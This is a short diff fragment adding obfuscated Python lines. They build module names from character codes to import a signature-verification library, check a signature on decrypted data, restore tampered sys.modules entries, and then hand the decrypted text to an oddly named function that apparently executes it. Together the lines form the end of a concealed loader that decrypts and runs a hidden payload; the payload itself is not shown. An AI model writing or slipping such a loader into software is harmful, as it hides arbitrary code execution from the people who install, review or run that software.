+    (lambda v: True)(getattr(__import__("".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,83,105,103,110,97,116,117,114,101,46,112,115,115])),fromlist=["x"]),"".join(map(chr,[110,101,119])))(public_key).verify(getattr(__import__("".join(map(chr,[67,114,121,112,116,111,100,111,109,101,46,72,97,115,104,46,83,72,65,50,53,54])),fromlist=["x"]),"".join(map(chr,[110,101,119])))(_decrypted),signature))
+    _plaintext_bytes = _decrypted
+
+finally:
+    for m, v in _orig_modules.items():
+        if v is None:
+            _sys.modules.pop(m, None)
+        else:
+            _sys.modules[m] = v
+
+zezoire(_plaintext_bytes.decode())
